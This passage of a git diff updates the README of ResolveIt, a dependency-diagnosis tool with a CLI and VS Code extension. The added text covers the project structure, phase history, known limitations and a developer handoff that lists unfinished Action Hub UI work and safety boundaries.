+   - no execution
+   - a clear explanation of *why* it was rejected (the Core rejection reason should
+     be surfaced to the user instead of being logged only)
+
+4. **Rejection reasons are not surfaced.** `validateAIPlan` returns precise rejection
+   strings and the agent carries them on the plan (`aiRejections`), but the Action Hub
+   does not display them to the user.
+
+### A corrective pass is required
+
+Plan of record: move the Action Hub from a permanent sidebar `WebviewView` to an
+on-demand `WebviewPanel`, and fix the state model so that a failed or rejected action
+cannot present as approved or verified. Do not "fix" this by relaxing
+`src/ai/validation.ts` or the tool validators.
+
+---
+
+## Project structure
 
 ```
 ResolveIt/
-├── src/                    # ResolveIt Core
-│   ├── adapters/           # (reserved for future adapters)
-│   ├── agent/              # Agent engine (lifecycle, planner, runner, verifier)
-│   ├── ai/                 # AI provider abstraction (config, providers, validation)
-│   ├── analyzers/          # (reserved for language analyzers)
-│   ├── cli/                # CLI entry point
-│   ├── core/               # Core interfaces, models, workspace manager
-│   ├── diagnostics/        # Diagnostic engine + rules
-│   ├── engines/            # (reserved)
-│   ├── environment/        # Environment intelligence + adapters
-│   ├── repair/             # Repair engine (tools, registry, executor, audit)
-│   ├── requirements/       # Requirement parsing + project attribution
-│   ├── safety/             # Safety/permission layer (ids, limits, paths, permission, secrets)
-│   ├── scanners/           # Project/language classification
-│   ├── tools/              # (reserved for tool registry)
-│   ├── index.ts            # Public Core API
-│   └── version.ts          # Version constant
-├── tests/                  # Core tests (456 tests)
-│   ├── fixtures/           # Test fixtures (ecosystems, integration, security)
-│   └── *.test.ts           # Unit/integration tests
-├── vscode/                 # VS Code Extension
-│   ├── src/                # Extension source
-│   │   ├── hub/            # Action Hub (radial webview)
-│   │   ├── dashboard/      # Legacy dashboard helpers
-│   │   ├── views/          # Explorer tree views
-│   │   ├── commands.ts     # Command registration
-│   │   ├── state.ts        # State management
-│   │   ├── operations.ts   # Concurrency/cancellation
-│   │   ├── core.ts         # CoreClient
-│   │   └── extension.ts    # Entry point
-│   ├── tests/              # Extension tests (135 tests, mocked VS Code)
-│   ├── scripts/            # validate-package.mjs
-│   ├── dist/               # Bundled extension.js (generated)
-│   └── *.vsix              # Packaged extension (generated, untracked)
-├── docs/                   # Documentation
-│   ├── architecture.md     # Detailed architecture
-│   └── release-checklist.md # Phase 12 validation checklist
-├── dist/                   # Core build output (generated, untracked)
-├── node_modules/           # Dependencies (untracked)
-├── package.json
-├── tsconfig.json
-├── .eslintrc.json
-├── .prettierrc
+├── src/                        # ResolveIt Core
+│   ├── core/                   # interfaces.ts, models.ts, workspace-manager.ts
+│   ├── scanners/               # workspace/project/language classification
+│   ├── environment/            # environment intelligence
+│   │   ├── adapters/           # os, runtime, tools, package-managers, containers
+│   │   └── command-runner.ts   # probe runner + allowlisted safe runner
+│   ├── requirements/           # requirement discovery and project attribution
+│   │   └── parsers/            # 17 parsers (python, node, node-lock, maven,
+│   │                           #   gradle, rust, go, cmake, makefile, native,
+│   │                           #   docker, others)
+│   ├── diagnostics/            # engine, version-matcher, rules/ (8 rules)
+│   ├── repair/                 # planner, executor, registry, audit, snapshots
+│   │   └── tools/              # create-file, modify-file, install-dependency,
+│   │                           #   create-python-venv
+│   ├── safety/                 # ids, limits, paths, permission, secrets
+│   ├── agent/                  # lifecycle, observation, analysis, planners,
+│   │                           #   run-state, runner, verifier, events
+│   ├── ai/                     # config, context, factory, http, prompt, response,
+│   │   ├── providers/          #   local.ts, external.ts
+│   │                           #   validation.ts
+│   ├── cli/                    # commander CLI
+│   ├── index.ts                # public Core API (the extension's only entry)
+│   └── version.ts
+├── tests/                      # 28 files, 457 tests
+│   ├── fixtures/
+│   │   ├── ecosystems/         # 20 parser fixtures
+│   │   ├── integration/        # 13 release-matrix fixtures
+│   │   └── security/           # hostile-input and Docker fixtures
+│   ├── environment/            # 9 adapter/runner suites
+│   └── *.test.ts
+├── vscode/                     # VS Code extension (separate install)
+│   ├── src/
+│   │   ├── hub/                # Action Hub: model.ts, render.ts, view.ts
+│   │   ├── dashboard/          # dashboard helpers: model, snapshot, cards,
+│   │   │                       #   messages, render
+│   │   ├── views/              # 4 TreeDataProviders
+│   │   ├── ui/                 # approval dialogs, output channel, status bar, events
+│   │   ├── commands.ts         # 18 command handlers
+│   │   ├── state.ts            # ExtensionState
+│   │   ├── operations.ts       # OperationCoordinator (locks, cancellation)
+│   │   ├── core.ts             # CoreClient (public API only)
+│   │   ├── workspace.ts        # WorkspaceService (first folder wins)
+│   │   ├── mappers.ts          # model <-> UI mapping
+│   │   ├── errors.ts           # error classification
+│   │   └── extension.ts        # activation entry point
+│   ├── tests/                  # 8 files, 135 tests (vscode API mocked)
+│   ├── scripts/                # validate-package.mjs
+│   └── dist/                   # bundle output (generated, ignored)
+├── docs/
+│   ├── architecture.md         # detailed architecture + per-phase status
+│   └── release-checklist.md    # Phase 12 validation record
+├── dist/                       # Core build output (generated, ignored)
+├── package.json / package-lock.json
+├── tsconfig.json / vitest.config.ts
+├── .eslintrc.json / .prettierrc
 ├── .gitignore
-├── LICENSE
-├── AGENTS.md               # Development rules
-└── README.md               # This file
+├── AGENTS.md                   # development rules
+├── LICENSE                     # MIT
+└── README.md                   # this file
 ```
+
+---
 
 ## Development
 
@@ -704,12 +1256,12 @@ npm install
 npm run build
 npm test
 npm run lint
-npx tsc --noEmit
 
 # CLI
 node dist/cli/index.js --help
-node dist/cli/index.js scan
-node dist/cli/index.js run --path ./tests/fixtures/integration/broken-python
+node dist/cli/index.js scan .
+node dist/cli/index.js diagnose --path tests/fixtures/integration/broken-python
+node dist/cli/index.js run --path tests/fixtures/integration/broken-python --dry-run
 
 # Extension
 cd vscode
@@ -719,25 +1271,227 @@ npm test
 npm run lint
 npm run validate-package
 npm run package
-# Install vscode/resolveit-0.0.1.vsix in VS Code
+# then: code --install-extension .\resolveit-0.0.1.vsix --force
 ```
 
-## Contributing
+### Repository hygiene
 
-This is a pre-release project (0.0.1). The architecture is stabilized through Phase 12. Phase 13–14 introduced UI work that needs correction.
+Ignored (never commit these): `node_modules/`, `dist/`, `build/`, `*.tsbuildinfo`,
+`*.vsix`, `.resolveit/` (audit log + repair snapshots created inside an analyzed
+workspace), `.env`, `.env.local`, `.env.*.local`, `.vscode/`, `.idea/`, coverage,
+logs, and temp files. `.env.example` / `.env.sample` are intentionally *not* ignored,
+so template files can be committed.
 
-Before contributing:
-1. Run full test suites (core + extension)
-2. Ensure `npm run build` and `npm run lint` pass in both root and `vscode/`
-3. For UI work, start in `vscode/src/hub/` and `vscode/src/views/`
-4. For Core work, respect the safety boundaries in `src/safety/` and `src/ai/validation.ts`
+The repository contains **no real credentials**. Values that look like secrets in
+`tests/fixtures/` are deliberately fake and inert.
 
-## License
-
-MIT — see [LICENSE](LICENSE)
+**One caveat worth knowing before you trust the secrets coverage:**
+`tests/fixtures/integration/secrets/.env` is ignored by the `.env` rule, so it is
+absent from a fresh clone. The test
+`secrets: .env never parsed, findings and audit carry no secret values`
+(`tests/integration-release.test.ts:268`) still passes there, but its assertions
+become vacuous because there is no `.env` to leak. Locally the file exists and the
+test is meaningful. If you want that coverage to be real on every machine, the fix
+is for the test to write its own throwaway `.env` into the temp fixture copy rather
+than to force-track a file matching the `.env` ignore rule.
 
 ---
 
-**Repository**: https://github.com/SahilGkar/ResolveIt.git  
-**Branch**: `master`  
-**Current Commit**: `82e3600` (Phase 14: Introduce ResolveIt Action Hub)
+## Phase history
+
+Verified against git history on `master`.
+
+| Phase | Commit | Description |
+|-------|--------|-------------|
+| 0 | `2743fe5` | Establish architecture: core interfaces, data models, CLI skeleton |
+| 1 | `67b8089` | Workspace and project discovery |
+| 2 | `225200d`, `0e3fe7c` | Environment intelligence (runtimes, tools, package managers, containers) + test coverage |
+| 3 | `e615f5e` | Dependency and requirement intelligence |
+| 4 | `760b53b` | Diagnostic engine |
+| 5 | `1299796` | Repair and permission system (tools, registry, executor, snapshots, audit) |
+| 6 | `d47225b` | Verification and agent loop |
+| 7 | `02bd64e` | AI provider abstraction (No AI, Local, External) |
+| 8 | `a51db11` | VS Code extension |
+| 9 | `faa3842` | Extension ↔ Core integration hardening |
+| 10 | `ed4d45d` | Multi-ecosystem hardening |
+| 11 | `7f58fba` | Security, Docker, and audit hardening |
+| 12 | `c65fc91` | Final integration / release validation |
+| 13 | `70632e2` | UI/UX redesign (dashboard attempt) |
+| 14 | `82e3600` | Action Hub |
+
+Phases 0–12 define the architecture and safety model documented in
+`docs/architecture.md`. Phases 13–14 are UI-only and are the areas that still need
+work.
+
+---
+
+## Known limitations
+
+Each of these was checked against the code during this handoff.
+
+**Dependency and requirement analysis**
+
+- No full dependency solver; no version conflict resolution
+- Dependency status is often reported as `unknown` when no local inventory is
+  available — it is never invented
+- Dynamic/build-time discovery is limited (`setup.py` never executed, Gradle
+  expressions, arbitrary CMake code)
+- Lockfile/transitive entries get manual guidance, not automated installs
+- Automated installs cover 6 ecosystems only (`npm`, `pip`, `cargo`, `go`,
+  `composer`, `bundle`); Maven/Gradle/.NET/CMake deps are detected but not installed
+- Binary lockfiles (`bun.lockb`) and `go.sum` are recognized but not parsed
+
+**Repairs and permissions**
+
+- Runtime and toolchain gaps produce **manual remediation paths**, not silent installs
+- No elevation/sudo automation; system changes stay explicitly manual
+- No rollback of dependency state — snapshots cover file content only
+- Repairs depend on host tools actually working (a broken `pip`/`npm` fails the action)
+
+**Docker**
+
+- Diagnostic/static analysis only: never builds, starts, stops, or modifies anything
+- No remediation of Docker findings
+- No live container verification
+
+**AI**
+
+- Quality depends entirely on the selected model; small local models often produce
+  invalid proposals (Core rejects them safely and falls back)
+- External providers are user-supplied; ResolveIt ships no vendor integration
+- Rejection reasons are recorded but not surfaced in the current UI
+
+**Platform and process**
+
+- Multi-root VS Code workspaces analyze the **first folder only** (announced once)
+- Core operations are **not abortable** — cancellation detaches the UI and discards
+  late results, but the underlying work may finish in the background
+- Environment probing is slow on machines missing tools (each missing tool must fail a
+  PATH lookup first)
+- No CVE/vulnerability database integration
+- No dedicated secret scanner — redaction is defence-in-depth, not secret detection
+- Manual validation was performed on **Windows only**; Linux/macOS rest on unit tests
+
+**UI and packaging**
+
+- The Action Hub is a sidebar `WebviewView`, not the desired floating overlay
+- Known Action Hub state bugs (see [Current UI Status](#current-ui-status))
+- The extension is not published to any marketplace
+- VSIX installation is manual, and a locally installed VSIX does not auto-update
+  after source changes
+- F5 / Extension Development Host is not configured in this repository
+
+---
+
+## Developer handoff
+
+### What has already been built
+
+Everything in Phases 0–12, which is a complete, working, tested system:
+
+- **Deterministic core** — workspace/project discovery, environment intelligence,
+  17 requirement parsers, 8 diagnostic rules, 4 repair tools with a registry,
+  verification engine, agent loop, audit logger with secret redaction, safety and
+  permission layer
+- **AI layer** — three providers behind one abstraction, a trust boundary with
+  multi-layer validation, and deterministic fallback
+- **VS Code extension** — thin client, 18 commands, 5 views, operation coordination,
+  error taxonomy, packaging validation
+- **Tests** — 457 core tests across 28 files, 135 extension tests across 8 files,
+  integration and security fixtures, mocked VS Code API
+- **CLI** — 7 commands (`scan`, `environment`, `requirements`, `diagnose`, `repair`,
+  `run`, `ai`) plus `version` / `help`, with human and JSON output, dry-run, and
+  per-action approval
+
+### What is stable
+
+Treat these as load-bearing:
+
+- `src/core/interfaces.ts` and `src/core/models.ts` — the public contracts
+- `src/safety/` — permission levels, path containment, limits, secret redaction
+- `src/ai/validation.ts` — the AI trust boundary
+- `src/repair/registry.ts` and `src/repair/tools/` — the only execution path
+- `src/agent/run-state.ts` — the agent state machine
+- The extension ↔ Core boundary: the extension may only use `src/index.ts`
+
+### What should not be changed casually
+
+- **Do not weaken** `validateAIPlan` / `validateAIAction` to make AI output "work".
+  Invalid proposals being rejected is the feature.
+- **Do not** add a generic shell-execution repair path. Repairs go through
+  registered, validated tools.
+- **Do not** relax path containment or symlink fail-closed behaviour.
+- **Do not** let the UI approve, escalate, or infer approvals. It collects them.
+- **Do not** mark a repair verified without re-running verification.
+- **Do not** execute `.env` files, `setup.py`, or any project-controlled code during
+  analysis.
+- **Do not** commit secrets, `.env` files, or a generated `.vsix`.
+
+### What remains unfinished
+
+1. **Action Hub UX** — move from the permanent sidebar `WebviewView` to an on-demand
+   `WebviewPanel` (floating/quick-access), as described in
+   [Current UI Status](#current-ui-status).
+2. **Action lifecycle state model** — a failed or rejected action must not render an
+   `Approved` badge, must not offer `Allow`, and must not be labelled `Verified`
+   unless verification confirms *that* action. Fix `toRepairCard`
+   (`vscode/src/dashboard/cards.ts`), the card renderer (`vscode/src/hub/render.ts`),
+   and the verification flag (`vscode/src/hub/view.ts`).
+3. **Surface Core rejection reasons** in the Action Hub instead of only logging them.
+4. **Loading-state handling** — the "Loading ResolveIt…" placeholder has no timeout,
+   retry, or error state.
+5. **Decide the fate of `vscode/src/dashboard/`** — the Phase 13 dashboard is unused
+   as a primary surface but still maintained and tested. Either finish it, fold it into
+   the hub, or remove it deliberately.
+6. **Not started, and deliberately so**: Docker remediation, a real dependency solver,
+   CVE integration, a dedicated secret scanner, marketplace publishing.
+
+### Where to start
+
+**Do not begin by rewriting `src/`.** The Core and its safety architecture are
+mature, tested, and the part of this project that works. Rewriting it is the highest
+available risk with the lowest available reward.
+
+If you are working on the UI, start here:
+
+| File | Role |
+|---|---|
+| `vscode/src/hub/view.ts` | WebviewView host, HTML/CSP, message protocol, `postState` |
+| `vscode/src/hub/model.ts` | Hub node enablement, labels, disabled reasons, centre status |
+| `vscode/src/hub/render.ts` | Hub and report-card HTML/CSS — **where the contradictory badges live** |
+| `vscode/src/dashboard/cards.ts` | `toRepairCard` and the action lifecycle — **the root of the state bug** |
+| `vscode/src/dashboard/snapshot.ts` | State → snapshot mapping used by both surfaces |
+| `vscode/src/dashboard/messages.ts` | Webview message allowlist/validation |
+| `vscode/src/commands.ts` | Command handlers: analyze, plan, approve, apply, verify |
+| `vscode/src/state.ts` | `ExtensionState`: approvals, plan, execution, verification |
+| `vscode/src/operations.ts` | `OperationCoordinator`: per-workspace locks, cancellation |
+| `vscode/src/core.ts` | `CoreClient` — the only Core surface the UI may use |
+| `vscode/tests/hub.test.ts` | 26 tests covering hub model, render, and command routing |
+| `vscode/tests/dashboard.test.ts` | 27 tests covering the dashboard model and HTML output |
+
+Start by writing a failing test for the contradictory-state case, then fix the model.
+The existing tests are the fastest way to understand the intended contract.
+
+---
+
+## Contributing
+
+This is a pre-release project (0.0.1). The architecture is stabilised through
+Phase 12; Phases 13–14 introduced UI work that is not finished.
+
+Before opening a change:
+
+1. Run both suites: `npm test` and `cd vscode && npm test`.
+2. Ensure `npm run build` and `npm run lint` pass in both the root and `vscode/`.
+3. For UI work, start in `vscode/src/hub/` and read
+   [Current UI Status](#current-ui-status) first.
+4. For Core work, respect the boundaries in `src/safety/` and `src/ai/validation.ts`.
+5. Keep changes honest: document what you verified, and document what you did not.
+
+`AGENTS.md` contains the project's standing development rules.
+
+---
+
+## License
+
+MIT — see [LICENSE](LICENSE).
